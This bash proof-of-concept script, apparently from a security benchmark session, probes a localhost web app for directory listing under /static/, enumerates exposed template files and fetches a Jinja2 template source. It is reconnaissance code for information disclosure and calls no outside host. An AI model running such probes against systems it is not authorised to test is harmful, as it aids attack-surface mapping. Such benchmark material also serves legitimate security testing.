#!/bin/bash
# POC: Demonstrates directory listing vulnerability on /static/ directory tree including template file exposure
# Target: ./repo
# Created: 2025-10-31T14:52:47.426Z
# Session: benchmark-XBEN-022-24-mhey9d7a

TARGET="http://localhost:8080"
echo "==================================================================="
echo "POC: Directory Listing Enabled on Static Resources"
echo "==================================================================="
echo ""

# Test 1: Check /static/ directory
echo "[*] Test 1: Checking /static/ directory for listing..."
RESPONSE1=$(curl -s -o /tmp/static_listing.html -w "%{http_code}" "$TARGET/static/")
if [ "$RESPONSE1" = "200" ]; then
    echo "[+] SUCCESS: /static/ directory listing is accessible (HTTP $RESPONSE1)"
    # Check if it contains directory listing indicators
    if grep -q -E "(Index of|Directory listing|<title>.*static.*</title>)" /tmp/static_listing.html 2>/dev/null; then
        echo "[+] Confirmed: Response contains directory listing"
    fi
    # Extract subdirectories
    SUBDIRS=$(grep -o -E 'href="[^"]*/"' /tmp/static_listing.html 2>/dev/null | sed 's/href="//g' | sed 's/"//g' | grep -v "^\.\." | head -5)
    if [ ! -z "$SUBDIRS" ]; then
        echo "[+] Found subdirectories:"
        echo "$SUBDIRS" | sed 's/^/    - /'
    fi
else
    echo "[-] FAILED: /static/ returned HTTP $RESPONSE1"
fi
echo ""

# Test 2: Check /static/templates/ directory
echo "[*] Test 2: Checking /static/templates/ directory for listing..."
RESPONSE2=$(curl -s -o /tmp/templates_listing.html -w "%{http_code}" "$TARGET/static/templates/")
if [ "$RESPONSE2" = "200" ]; then
    echo "[+] SUCCESS: /static/templates/ directory listing is accessible (HTTP $RESPONSE2)"
    # Extract template files
    TEMPLATES=$(grep -o -E 'href="[^"]*\.html"' /tmp/templates_listing.html 2>/dev/null | sed 's/href="//g' | sed 's/"//g' | sort -u)
    if [ ! -z "$TEMPLATES" ]; then
        echo "[+] Found template files:"
        echo "$TEMPLATES" | sed 's/^/    - /'
        TEMPLATE_COUNT=$(echo "$TEMPLATES" | wc -l)
        echo "[!] CRITICAL: $TEMPLATE_COUNT template files exposed via directory listing"
    fi
else
    echo "[-] FAILED: /static/templates/ returned HTTP $RESPONSE2"
fi
echo ""

# Test 3: Verify template file is directly accessible
echo "[*] Test 3: Attempting to access template source code..."
RESPONSE3=$(curl -s -o /tmp/error_template.html -w "%{http_code}" "$TARGET/static/templates/error.html")
if [ "$RESPONSE3" = "200" ]; then
    echo "[+] SUCCESS: Template file directly accessible (HTTP $RESPONSE3)"
    # Check for Jinja2 template markers
    if grep -q -E "({%|{{|}}).*({%|{{|}})" /tmp/error_template.html 2>/dev/null; then
        echo "[!] CRITICAL: Template contains Jinja2 directives - application logic exposed"
        JINJA_LINES=$(grep -E "({%|{{)}}" /tmp/error_template.html | head -3)
        echo "[+] Sample Jinja2 code found:"
        echo "$JINJA_LINES" | sed 's/^/    /'
    fi
    FILE_SIZE=$(wc -c < /tmp/error_template.html)
    echo "[+] Template file size: $FILE_SIZE bytes"
else
    echo "[-] FAILED: Template file returned HTTP $RESPONSE3"
fi
echo ""

# Test 4: Check other static subdirectories
echo "[*] Test 4: Checking other static subdirectories..."
for SUBDIR in "js" "css" "images"; do
    RESPONSE=$(curl -s -o /tmp/${SUBDIR}_listing.html -w "%{http_code}" "$TARGET/static/$SUBDIR/")
    if [ "$RESPONSE" = "200" ]; then
        echo "[+] /static/$SUBDIR/ directory listing accessible (HTTP $RESPONSE)"
    else
        echo "[-] /static/$SUBDIR/ returned HTTP $RESPONSE"
    fi
done
echo ""

# Summary
echo "==================================================================="
echo "VULNERABILITY SUMMARY"
echo "==================================================================="
echo "[!] Directory listing is enabled on /static/ and subdirectories"
echo "[!] Template files with application logic are publicly accessible"
echo "[!] This enables reconnaissance and attack surface mapping"
echo "[!] Risk Level: MEDIUM - Information Disclosure"
echo "==================================================================="

# Cleanup
rm -f /tmp/static_listing.html /tmp/templates_listing.html /tmp/error_template.html /tmp/js_listing.html /tmp/css_listing.html /tmp/images_listing.html

exit 0